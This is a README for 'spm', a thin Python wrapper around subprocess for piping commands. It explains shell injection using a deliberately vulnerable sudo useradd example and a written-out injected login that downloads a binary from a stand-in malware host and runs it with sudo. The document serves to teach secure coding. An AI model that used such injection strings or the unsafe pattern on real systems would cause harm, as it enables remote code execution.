spm (SubProcessesManager)
=========================

This provides a very thin KISS layer on top of the python standard library's
``subprocess`` module. This library supports Python 2 and Python 3.

This makes it easy to pipe subprocesses, and pipe subprocesses input/output
to files.

It only has four rules:

* Simple programming interface
* Don't reimplement the wheel. (It tries uses the ``subprocess`` standard
  module as much as possible) 
* It only does one thing, and try to do it well.
* Use argument list instead of one command string.

Secure subprocess invokation
----------------------------

For those who don't understand the last rule. There are two ways to ways to
invoke subprocesses in python: One method is insecure, the other one is
secure.

.. code:: python

    import subprocess

    # Insecure subprocess invocation
    subprocess.check_call("echo foo", shell=True)
    # Secure subprocess invocation
    subprocess.check_call(['echo', 'foo'])

The second one is secure, because it prevents shell code injection. If we over
simplify, the first method, could be implemented this way:

.. code:: python

    def insecure_check_call(command_line):
        """
        Same as check_call(shell=True)
        """
        # Runs /bin/bash -c "the given command line"
        subprocess.check_call(['/bin/bash', '-c', command_line])


Let's use the following code as example:

.. code:: python

    import subprocess
    # Get insecure and unchecked data from a user
    from somewhere import get_login_from_user()

    def create_user():
        cmd = "sudo useradd '{}'".format(get_login_from_user())
        subprocess.check_call(cmd)

A user can inject code if they enter the login
``' || wget http://malware.example.com/malware -O /tmp && sudo /tmp/malware``.
Because this will execute:
``sudo user '' || wget [...] -O /tmp && sudo /tmp/malware``.

Why another library?
--------------------

.. image:: https://imgs.xkcd.com/comics/standards.png
   :alt: XKCD Comic strip: "How Standards Profilef
   :align: center

Here are the existing libraries:

* sh_: doing to much. The programming interface for piping commands is
  complex and bad.
* execute_: old, vulnerable to shell injection.

And many other are unmaintained or worse.

.. _sh: https://amoffat.github.io/sh/
.. _execute: https://pythonhosted.org/execute/


What do you mean by KISS?
-------------------------

KISS lost it original sense. Now it's just an hipster word which means "just
use my library because it's cool".

Here I mean KISS in its original sense: Keep It Simple and Stupid.

* Simple: this library is one file with less than 500 lines (excluding testing)
* Stupid: this library has two functions: ``pipe()`` and ``run()``
